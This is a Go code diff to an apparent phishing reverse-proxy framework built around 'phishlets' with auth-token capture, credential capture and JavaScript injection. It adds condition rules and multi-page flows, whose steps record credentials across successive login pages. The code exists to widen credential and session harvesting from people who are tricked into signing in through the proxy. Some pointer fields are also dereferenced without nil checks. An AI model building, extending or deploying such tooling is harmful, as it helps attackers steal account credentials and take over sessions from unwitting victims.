@@ -131,6 +131,8 @@ type Phishlet struct {
 	intercept        []Intercept
 	customParams     map[string]string
 	isTemplate       bool
+	conditions       []Condition
+	multiPageFlows   []MultiPageFlow
 }
 
 type ConfigParam struct {
@@ -218,19 +220,73 @@ type ConfigIntercept struct {
 	Mime       *string `mapstructure:"mime"`
 }
 
+type Condition struct {
+	Name    string            `mapstructure:"name"`
+	Type    string            `mapstructure:"type"`
+	Values  []string          `mapstructure:"values"`
+	Regex   *regexp.Regexp    `mapstructure:"regex"`
+	Actions []ConditionAction `mapstructure:"actions"`
+}
+
+type ConditionAction struct {
+	Type     string `mapstructure:"type"`
+	Value    string `mapstructure:"value"`
+	Template string `mapstructure:"template"`
+}
+
+type MultiPageFlow struct {
+	Name  string     `mapstructure:"name"`
+	Steps []FlowStep `mapstructure:"steps"`
+}
+
+type FlowStep struct {
+	Path        string            `mapstructure:"path"`
+	Credentials []string          `mapstructure:"credentials"`
+	NextStep    string            `mapstructure:"next_step"`
+	Conditions  map[string]string `mapstructure:"conditions"`
+}
+
+type ConfigCondition struct {
+	Name    *string                `mapstructure:"name"`
+	Type    *string                `mapstructure:"type"`
+	Values  *[]string              `mapstructure:"values"`
+	Regex   *string                `mapstructure:"regex"`
+	Actions *[]ConfigConditionAction `mapstructure:"actions"`
+}
+
+type ConfigConditionAction struct {
+	Type     *string `mapstructure:"type"`
+	Value    *string `mapstructure:"value"`
+	Template *string `mapstructure:"template"`
+}
+
+type ConfigMultiPageFlow struct {
+	Name  *string           `mapstructure:"name"`
+	Steps *[]ConfigFlowStep `mapstructure:"steps"`
+}
+
+type ConfigFlowStep struct {
+	Path        *string            `mapstructure:"path"`
+	Credentials *[]string          `mapstructure:"credentials"`
+	NextStep    *string            `mapstructure:"next_step"`
+	Conditions  *map[string]string `mapstructure:"conditions"`
+}
+
 type ConfigPhishlet struct {
-	Name        string             `mapstructure:"name"`
-	RedirectUrl string             `mapstructure:"redirect_url"`
-	Params      *[]ConfigParam     `mapstructure:"params"`
-	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts"`
-	SubFilters  *[]ConfigSubFilter `mapstructure:"sub_filters"`
-	AuthTokens  *[]ConfigAuthToken `mapstructure:"auth_tokens"`
-	AuthUrls    []string           `mapstructure:"auth_urls"`
-	Credentials *ConfigCredentials `mapstructure:"credentials"`
-	ForcePosts  *[]ConfigForcePost `mapstructure:"force_post"`
-	LandingPath *[]string          `mapstructure:"landing_path"`
-	LoginItem   *ConfigLogin       `mapstructure:"login"`
-	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
+	Name            string                   `mapstructure:"name"`
+	RedirectUrl     string                   `mapstructure:"redirect_url"`
+	Params          *[]ConfigParam           `mapstructure:"params"`
+	ProxyHosts      *[]ConfigProxyHost       `mapstructure:"proxy_hosts"`
+	SubFilters      *[]ConfigSubFilter       `mapstructure:"sub_filters"`
+	AuthTokens      *[]ConfigAuthToken       `mapstructure:"auth_tokens"`
+	AuthUrls        []string                 `mapstructure:"auth_urls"`
+	Credentials     *ConfigCredentials       `mapstructure:"credentials"`
+	ForcePosts      *[]ConfigForcePost       `mapstructure:"force_post"`
+	LandingPath     *[]string                `mapstructure:"landing_path"`
+	LoginItem       *ConfigLogin             `mapstructure:"login"`
+	JsInject        *[]ConfigJsInject        `mapstructure:"js_inject"`
+	Conditions      *[]ConfigCondition       `mapstructure:"conditions"`
+	MultiPageFlows  *[]ConfigMultiPageFlow   `mapstructure:"multi_page_flows"`
 	Intercept   *[]ConfigIntercept `mapstructure:"intercept"`
 }
 
@@ -758,6 +814,90 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			p.landing_path[n] = p.paramVal(p.landing_path[n])
 		}
 	}
+
+	if fp.Conditions != nil {
+		for _, cond := range *fp.Conditions {
+			condition := Condition{
+				Name:    p.paramVal(*cond.Name),
+				Type:    p.paramVal(*cond.Type),
+				Actions: []ConditionAction{},
+			}
+			
+			if cond.Values != nil {
+				for _, val := range *cond.Values {
+					condition.Values = append(condition.Values, p.paramVal(val))
+				}
+			}
+			
+			if cond.Regex != nil {
+				var err error
+				condition.Regex, err = regexp.Compile(p.paramVal(*cond.Regex))
+				if err != nil {
+					return fmt.Errorf("invalid regex in condition '%s': %v", condition.Name, err)
+				}
+			}
+			
+			if cond.Actions != nil {
+				for _, act := range *cond.Actions {
+					action := ConditionAction{}
+					if act.Type != nil {
+						action.Type = p.paramVal(*act.Type)
+					}
+					if act.Value != nil {
+						action.Value = p.paramVal(*act.Value)
+					}
+					if act.Template != nil {
+						action.Template = p.paramVal(*act.Template)
+					}
+					condition.Actions = append(condition.Actions, action)
+				}
+			}
+			
+			p.conditions = append(p.conditions, condition)
+		}
+	}
+
+	if fp.MultiPageFlows != nil {
+		for _, flow := range *fp.MultiPageFlows {
+			multiFlow := MultiPageFlow{
+				Steps: []FlowStep{},
+			}
+			
+			if flow.Name != nil {
+				multiFlow.Name = p.paramVal(*flow.Name)
+			}
+			
+			if flow.Steps != nil {
+				for _, step := range *flow.Steps {
+					flowStep := FlowStep{
+						Conditions: make(map[string]string),
+					}
+					
+					if step.Path != nil {
+						flowStep.Path = p.paramVal(*step.Path)
+					}
+					if step.NextStep != nil {
+						flowStep.NextStep = p.paramVal(*step.NextStep)
+					}
+					if step.Credentials != nil {
+						for _, cred := range *step.Credentials {
+							flowStep.Credentials = append(flowStep.Credentials, p.paramVal(cred))
+						}
+					}
+					if step.Conditions != nil {
+						for k, v := range *step.Conditions {
+							flowStep.Conditions[p.paramVal(k)] = p.paramVal(v)
+						}
+					}
+					
+					multiFlow.Steps = append(multiFlow.Steps, flowStep)
+				}
+			}
+			
+			p.multiPageFlows = append(p.multiPageFlows, multiFlow)
+		}
+	}
+
 	return nil
 }
 
@@ -1105,4 +1245,29 @@ func (p *Phishlet) paramVal(s string) string {
 		}
 	}
 	return ret
+}
+
+func (p *Phishlet) HasConditions() bool {
+	return len(p.conditions) > 0
+}
+
+func (p *Phishlet) HasMultiPageFlows() bool {
+	return len(p.multiPageFlows) > 0
+}
+
+func (p *Phishlet) GetConditions() []Condition {
+	return p.conditions
+}
+
+func (p *Phishlet) GetMultiPageFlows() []MultiPageFlow {
+	return p.multiPageFlows
+}
+
+func (p *Phishlet) GetMultiPageFlow(name string) *MultiPageFlow {
+	for _, flow := range p.multiPageFlows {
+		if flow.Name == name {
+			return &flow
+		}
+	}
+	return nil
 }
